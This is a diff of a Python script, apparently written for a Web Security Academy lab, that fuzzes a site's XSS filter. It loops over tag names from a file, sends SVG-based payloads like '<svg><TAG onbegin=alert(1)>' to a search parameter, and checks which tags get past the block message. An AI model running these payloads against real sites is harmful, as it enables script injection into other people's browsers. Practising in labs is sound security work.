@@ -84,9 +84,12 @@ def customIterate(url, injection):
         'http' : '127.0.0.1:8080',
         }
 
-    for i in open("event.txt", "r"):
+    for i in open("tag.txt", "r"):
         testUrl = target + "<svg id=x tabindex=1 " + i.rstrip('\n') + "=alert(1)></svg>"
-        r = requests.get(testUrl, proxies=proxies, headers=headers)
+        testUrl2 = target + "<svg " + i.rstrip('\n') + "=alert(1)>"
+        testUrl3 = target + "<svg><" + i.rstrip('\n') + " onbegin=alert(1)>"
+
+        r = requests.get(testUrl3, proxies=proxies, headers=headers)
         
         if "Tag is not allowed" in r.text:
             pass
@@ -98,7 +101,7 @@ def customIterate(url, injection):
 
 
 if __name__ == '__main__':
-    url = "https://ac021f211ef5ea0cc054522500c500dd.web-security-academy.net/"
+    url = "https://ac4c1f411ec5b6bbc0a3b69200a70091.web-security-academy.net/"
     injection = "?search="
     
     #tag = allowedTag(url, injection)
